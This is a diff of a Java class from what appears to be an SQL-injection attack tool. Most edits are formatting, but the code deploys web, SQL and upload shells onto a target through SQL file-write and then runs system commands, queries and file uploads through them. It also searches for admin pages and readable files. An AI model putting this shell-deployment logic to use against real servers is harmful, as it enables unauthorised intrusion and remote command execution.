@@ -109,12 +109,12 @@ public class RessourceAccess {
     private InjectionModel injectionModel;
 
     public RessourceAccess(InjectionModel injectionModel) {
+        
         this.injectionModel = injectionModel;
         
-        // TODO
-        this.filenameWebshell = "..jw.php";
-        this.filenameSqlshell = ".js.php";
-        this.filenameUpload = ".ju.php";
+        this.filenameWebshell = "." + this.injectionModel.getVersionJsql() + ".jw.php";
+        this.filenameSqlshell = "." + this.injectionModel.getVersionJsql() + ".js.php";
+        this.filenameUpload = "." + this.injectionModel.getVersionJsql() + ".ju.php";
     }
 
     /**
@@ -130,9 +130,11 @@ public class RessourceAccess {
         String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");
         
         List<String> directoryNames = new ArrayList<>();
+        
         if (urlWithoutFileName.split("/").length == 0) {
             directoryNames.add("/");
         }
+        
         for (String directoryName: urlWithoutFileName.split("/")) {
             directoryNames.add(directoryName +"/");
         }
@@ -141,9 +143,13 @@ public class RessourceAccess {
         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
         
         StringBuilder urlPart = new StringBuilder();
+        
         for (String segment: directoryNames) {
+            
             urlPart.append(segment);
+            
             for (ItemList pageName: pageNames) {
+                
                 taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + pageName.toString(), this.injectionModel));
             }
         }
@@ -151,6 +157,7 @@ public class RessourceAccess {
         int nbAdminPagesFound = 0;
         int submittedTasks = directoryNames.size() * pageNames.size();
         int tasksHandled;
+        
         for (
             tasksHandled = 0;
             tasksHandled < submittedTasks && !this.isSearchAdminStopped;
@@ -190,6 +197,7 @@ public class RessourceAccess {
             }
             
         } catch (InterruptedException | ExecutionException e) {
+            
             LOGGER.error("Interruption while checking Admin pages", e);
             Thread.currentThread().interrupt();
         }
@@ -200,9 +208,15 @@ public class RessourceAccess {
     private void logSearchAdminPage(int nbAdminPagesFound, int submittedTasks, int tasksHandled) {
         
         String result =
-            "Found "+ nbAdminPagesFound +" admin page"+( nbAdminPagesFound > 1 ? 's' : "" )+" "
+            "Found "
+            + nbAdminPagesFound 
+            + " admin page" +( nbAdminPagesFound > 1 ? 's' : "" )
+            + " "
             + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : "")
-            + "on "+ submittedTasks +" page"+ ( submittedTasks > 1 ? 's' : "" ) +" searched"
+            + "on " 
+            + submittedTasks 
+            + " page" + ( submittedTasks > 1 ? 's' : "" ) 
+            + " searched"
         ;
         
         if (nbAdminPagesFound > 0) {
@@ -226,15 +240,18 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties()
+        String sourceShellToInject = this.injectionModel.getMediatorUtils()
+            .getPropertiesUtil()
+            .getProperties()
             .getProperty("shell.web")
-            .replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD)
-            .replace(DataAccess.TRAIL_IN_SHELL, DataAccess.TRAIL);
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
             pathShellFixed += "/";
         }
+        
         this.injectionModel.injectWithoutIndex(
             this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameWebshell)
         );
@@ -254,6 +271,7 @@ public class RessourceAccess {
                 throw new JSqlException("payload integrity verification: Empty payload");
             }
         } catch (JSqlException e) {
+            
             throw new JSqlException("injected payload does not match source", e);
         }
         
@@ -295,7 +313,9 @@ public class RessourceAccess {
             CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
             
             StringBuilder urlPart = new StringBuilder();
+            
             for (String segment: directoryNames) {
+                
                 urlPart.append(segment);
                 taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + this.filenameWebshell, this.injectionModel));
             }
@@ -303,29 +323,32 @@ public class RessourceAccess {
             int submittedTasks = directoryNames.size() * 1;
             int tasksHandled;
             String urlSuccess = null;
-            for (
-                tasksHandled = 0;
-                tasksHandled < submittedTasks;
-                tasksHandled++
-            ) {
+            
+            for (tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
                 try {
                     CallableHttpHead currentCallable = taskCompletionService.take().get();
                     
                     if (currentCallable.isHttpResponseOk()) {
+                        
                         urlSuccess = currentCallable.getUrl();
 
                         if (
                             !urlShellFixed.isEmpty() && urlSuccess.replace(this.filenameWebshell, "").equals(urlShellFixed)
                             || urlSuccess.replace(this.filenameWebshell, "").equals(urlProtocol + urlWithoutFileName)
                         ) {
+                            
                             LOGGER.debug("Connection to payload found at expected location \""+ urlSuccess +"\"");
+                            
                         } else {
+                            
                             LOGGER.debug("Connection to payload found at unexpected location \""+ urlSuccess +"\"");
                         }
                     } else {
+                        
                         LOGGER.trace("Connection to payload not found at \""+ currentCallable.getUrl() +"\"");
                     }
                 } catch (InterruptedException | ExecutionException e) {
+                    
                     LOGGER.error("Interruption while checking Web shell", e);
                     Thread.currentThread().interrupt();
                 }
@@ -333,14 +356,16 @@ public class RessourceAccess {
 
             taskExecutor.shutdown();
             taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
-            //
             
             if (urlSuccess != null) {
+                
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_SHELL_TAB);
                 request.setParameters(pathShellFixed.replace(this.filenameWebshell, ""), urlSuccess);
                 this.injectionModel.sendToViews(request);
+                
             } else {
+                
                 LOGGER.warn("HTTP connection to Web payload not found");
             }
         } else {
@@ -374,6 +399,7 @@ public class RessourceAccess {
         regexSearch.find();
 
         String result;
+        
         // IllegalStateException #1544: catch incorrect execution
         try {
             result = regexSearch.group(1);
@@ -418,10 +444,15 @@ public class RessourceAccess {
                 result = "No result.\nTry \""+ command.trim() +" 2>&1\" to get a system error message.\n";
             }
         } catch (UnsupportedEncodingException e) {
+            
             LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e, e);
+            
         } catch (IOException e) {
+            
             LOGGER.warn("Shell execution error: "+ e, e);
+            
         } finally {
+            
             // Unfroze interface
             Request request = new Request();
             request.setMessage(Interaction.GET_WEB_SHELL_RESULT);
@@ -446,15 +477,18 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties()
+        String sourceShellToInject = this.injectionModel.getMediatorUtils()
+            .getPropertiesUtil()
+            .getProperties()
             .getProperty("shell.sql")
-            .replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD)
-            .replace(DataAccess.TRAIL_IN_SHELL, DataAccess.TRAIL);
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
             pathShellFixed += "/";
         }
+        
         this.injectionModel.injectWithoutIndex(
             this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameSqlshell)
         );
@@ -489,11 +523,13 @@ public class RessourceAccess {
         }
 
         if (resultInjection.indexOf(sourceShellToInject) > -1) {
+            
             LOGGER.debug("SQL payload created into \""+ pathShellFixed + this.filenameSqlshell +"\"");
             //
             String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", "");
             
             String urlProtocol;
+            
             if ("/".equals(urlWithoutProtocol)) {
                 urlProtocol = url.replaceAll("/+$", "");
             } else {
@@ -503,9 +539,11 @@ public class RessourceAccess {
             String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "").replaceAll("/+", "/");
             
             List<String> directoryNames = new ArrayList<>();
+            
             if (urlWithoutFileName.split("/").length == 0) {
                 directoryNames.add("/");
             }
+            
             for (String directoryName: urlWithoutFileName.split("/")) {
                 directoryNames.add(directoryName +"/");
             }
@@ -515,6 +553,7 @@ public class RessourceAccess {
             
             StringBuilder urlPart = new StringBuilder();
             for (String segment: directoryNames) {
+                
                 urlPart.append(segment);
                 taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + this.filenameSqlshell, this.injectionModel));
             }
@@ -522,29 +561,33 @@ public class RessourceAccess {
             int submittedTasks = directoryNames.size() * 1;
             int tasksHandled;
             String urlSuccess = null;
-            for (
-                tasksHandled = 0;
-                tasksHandled < submittedTasks;
-                tasksHandled++
-            ) {
+            
+            for (tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
+                
                 try {
                     CallableHttpHead currentCallable = taskCompletionService.take().get();
                     
                     if (currentCallable.isHttpResponseOk()) {
+                        
                         urlSuccess = currentCallable.getUrl();
 
                         if (
                             !urlShellFixed.isEmpty() && urlSuccess.replace(this.filenameSqlshell, "").equals(urlShellFixed)
                             || urlSuccess.replace(this.filenameSqlshell, "").equals(urlProtocol + urlWithoutFileName)
                         ) {
+                            
                             LOGGER.debug("Connection to payload found at expected location \""+ urlSuccess +"\"");
+                            
                         } else {
+                            
                             LOGGER.debug("Connection to payload found at unexpected location \""+ urlSuccess +"\"");
                         }
                     } else {
+                        
                         LOGGER.trace("Connection to payload not found at \""+ currentCallable.getUrl() +"\"");
                     }
                 } catch (InterruptedException | ExecutionException e) {
+                    
                     LOGGER.error("Interruption while checking SQL shell", e);
                     Thread.currentThread().interrupt();
                 }
@@ -555,14 +598,18 @@ public class RessourceAccess {
             //
             
             if (urlSuccess != null) {
+                
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
                 request.setParameters(pathShellFixed.replace(this.filenameSqlshell, ""), urlSuccess, username, password);
                 this.injectionModel.sendToViews(request);
+                
             } else {
+                
                 LOGGER.warn("HTTP connection to SQL payload not found");
             }
         } else {
+            
             throw new JSqlException("Incorrect SQL payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
         }
     }
@@ -578,28 +625,36 @@ public class RessourceAccess {
     public void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
         
         String result = "";
+        
         try {
             result = this.runCommandShell(
                 urlShell + "?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password
             );
             
             if (result.indexOf("<SQLr>") > -1) {
+                
                 List<List<String>> listRows = new ArrayList<>();
                 Matcher rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
+                
                 while (rowsMatcher.find()) {
+                    
                     String values = rowsMatcher.group(1);
 
                     Matcher fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
                     List<String> listFields = new ArrayList<>();
                     listRows.add(listFields);
+                    
                     while (fieldsMatcher.find()) {
+                        
                         String field = fieldsMatcher.group(1);
                         listFields.add(field);
                     }
                 }
 
                 if (!listRows.isEmpty()) {
+                    
                     List<Integer> listFieldsLength = new ArrayList<>();
+                    
                     for (
                         final int[] indexLongestRowSearch = {0};
                         indexLongestRowSearch[0] < listRows.get(0).size();
@@ -614,42 +669,56 @@ public class RessourceAccess {
                     }
 
                     if (StringUtils.isNotEmpty(result)) {
+                        
                         StringBuilder tableText = new StringBuilder("+");
+                        
                         for (Integer fieldLength: listFieldsLength) {
                             tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
                         }
+                        
                         tableText.append("\n");
 
                         for (List<String> listFields: listRows) {
+                            
                             tableText.append("|");
                             int cursorPosition = 0;
+                            
                             for (String field: listFields) {
+                                
                                 tableText.append(" "+ field + StringUtils.repeat(" ", listFieldsLength.get(cursorPosition) - field.length()) +" |");
                                 cursorPosition++;
                             }
+                            
                             tableText.append("\n");
                         }
 
                         tableText.append("+");
+                        
                         for (Integer fieldLength: listFieldsLength) {
                             tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
                         }
+                        
                         tableText.append("\n");
                         
                         result = tableText.toString();
                     }
                 }
             } else if (result.indexOf("<SQLm>") > -1) {
+                
                 result = result.replace("<SQLm>", "") + "\n";
+                
             } else if (result.indexOf("<SQLe>") > -1) {
+                
                 result = result.replace("<SQLe>", "") + "\n";
             }
         } catch (UnsupportedEncodingException e) {
             
             LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e, e);
+            
         } catch (IOException e) {
             
             LOGGER.warn("Shell execution error: "+ e, e);
+            
         } finally {
             
             // Unfroze interface
@@ -674,9 +743,11 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties()
+        String sourceShellToInject = this.injectionModel.getMediatorUtils()
+            .getPropertiesUtil()
+            .getProperties()
             .getProperty("shell.upload")
-            .replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD);
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD);
         
         String pathShellFixed = pathFile;
         if (!pathShellFixed.matches(".*/$")) {
@@ -689,6 +760,7 @@ public class RessourceAccess {
 
         String[] sourcePage = {""};
         String sourceShellInjected;
+        
         try {
             sourceShellInjected = new SuspendableGetRows(this.injectionModel).run(
                 this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),
@@ -702,15 +774,18 @@ public class RessourceAccess {
                 throw new JSqlException("Bad payload integrity: Empty payload");
             }
         } catch (JSqlException e) {
+            
             throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
         }
 
         String urlFileFixed = urlFile;
         if ("".equals(urlFileFixed)) {
+            
             urlFileFixed = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().substring(0, this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1);
         }
         
         if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
+            
             LOGGER.debug("Upload payload deployed at \""+ urlFileFixed + this.filenameUpload +"\" in \""+ pathShellFixed + this.filenameUpload +"\"");
             
             String crLf = "\r\n";
@@ -719,11 +794,10 @@ public class RessourceAccess {
             URLConnection connection = urlUploadShell.openConnection();
             connection.setDoOutput(true);
             
-            try (
-                InputStream streamToUpload = new FileInputStream(file);
-            ) {
+            try (InputStream streamToUpload = new FileInputStream(file)) {
 
                 byte[] streamData = new byte[streamToUpload.available()];
+                
                 if (streamToUpload.read(streamData) == -1) {
                     throw new JSqlException("Error reading the file");
                 }
@@ -740,32 +814,33 @@ public class RessourceAccess {
                 connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                 connection.setRequestProperty("Content-Length", String.valueOf(headerForm.length() + headerFile.length() + streamData.length));
 
-                try (
-                    OutputStream streamOutputFile = connection.getOutputStream();
-                ) {
+                try (OutputStream streamOutputFile = connection.getOutputStream()) {
                     streamOutputFile.write(headerForm.getBytes());
     
                     int index = 0;
                     int size = 1024;
+                    
                     do {
                         if (index + size > streamData.length) {
                             size = streamData.length - index;
                         }
+                        
                         streamOutputFile.write(streamData, index, size);
                         index += size;
+                        
                     } while (index < streamData.length);
     
                     streamOutputFile.write(headerFile.getBytes());
                     streamOutputFile.flush();
                 }
                 
-                try (
-                    InputStream streamInputFile = connection.getInputStream();
-                ) {
+                try (InputStream streamInputFile = connection.getInputStream()) {
+                    
                     char buff = 512;
                     int len;
                     byte[] data = new byte[buff];
                     StringBuilder result = new StringBuilder();
+                    
                     do {
                         len = streamInputFile.read(data);
     
@@ -812,6 +887,7 @@ public class RessourceAccess {
         // Unsupported Reading file when <file> is not present in current xmlModel
         // Fix #41055: NullPointerException on getFile()
         if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource().getFile() == null) {
+            
             LOGGER.warn("Reading file on "+ this.injectionModel.getMediatorVendor().getVendor() +" is currently not supported");
             return false;
         }
@@ -827,18 +903,23 @@ public class RessourceAccess {
         );
 
         if ("".equals(resultInjection)) {
+            
             this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
             Request request = new Request();
             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
             this.injectionModel.sendToViews(request);
             this.readingIsAllowed = false;
+            
         } else if ("false".equals(resultInjection)) {
+            
             LOGGER.warn("Privilege FILE is not granted to current user, files can't be read");
             Request request = new Request();
             request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
             this.injectionModel.sendToViews(request);
             this.readingIsAllowed = false;
+            
         } else {
+            
             Request request = new Request();
             request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
             this.injectionModel.sendToViews(request);
@@ -865,18 +946,22 @@ public class RessourceAccess {
         }
 
         int countFileFound = 0;
+        
         ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable("CallableReadFile"));
         CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
 
         for (ItemList pathFile: pathsFiles) {
+            
             CallableFile callableFile = new CallableFile(pathFile.toString(), this.injectionModel);
             taskCompletionService.submit(callableFile);
+            
             this.callablesReadFile.add(callableFile);
         }
 
         List<String> duplicate = new ArrayList<>();
         int submittedTasks = pathsFiles.size();
         int tasksHandled;
+        
         for (
             tasksHandled = 0 ;
             tasksHandled < submittedTasks && !this.isSearchFileStopped ;
@@ -896,8 +981,10 @@ public class RessourceAccess {
                 this.injectionModel.sendToViews(request);
 
                 if (!duplicate.contains(path.replace(name, ""))) {
+                    
                     LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
                 }
+                
                 duplicate.add(path.replace(name, ""));
 
                 countFileFound++;
@@ -906,8 +993,10 @@ public class RessourceAccess {
         
         // Force ongoing suspendables to stop immediately
         for (CallableFile callableReadFile: this.callablesReadFile) {
+            
             callableReadFile.getSuspendableReadFile().stop();
         }
+        
         this.callablesReadFile.clear();
 
         taskExecutor.shutdown();
@@ -916,9 +1005,14 @@ public class RessourceAccess {
         this.isSearchFileStopped = false;
         
         String result =
-            "Found "+ countFileFound +" file"+( countFileFound > 1 ? 's' : "" )+" "
+            "Found "
+            + countFileFound 
+            + " file" +( countFileFound > 1 ? 's' : "" )
+            + " "
             + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : "")
-            + "on "+ submittedTasks +" files checked"
+            + "on " 
+            + submittedTasks 
+            +" files checked"
         ;
         if (countFileFound > 0) {
             LOGGER.debug(result);
@@ -962,11 +1056,14 @@ public class RessourceAccess {
         this.isScanStopped = false;
         
         for (ItemList urlItemList: urlsItemList) {
+            
             ItemListScan urlItemListScan = (ItemListScan) urlItemList;
             if (this.injectionModel.isStoppedByUser() || this.isScanStopped) {
                 break;
             }
+            
             LOGGER.info("Scanning "+ urlItemListScan.getBeanInjection().getUrl());
+            
             this.injectionModel.getMediatorUtils().getParameterUtil().controlInput(
                 urlItemListScan.getBeanInjection().getUrl(),
                 urlItemListScan.getBeanInjection().getRequest(),
@@ -1008,6 +1105,7 @@ public class RessourceAccess {
         
         // Force ongoing suspendable to stop immediately
         for (CallableFile callable: this.callablesReadFile) {
+            
             callable.getSuspendableReadFile().stop();
         }
     }
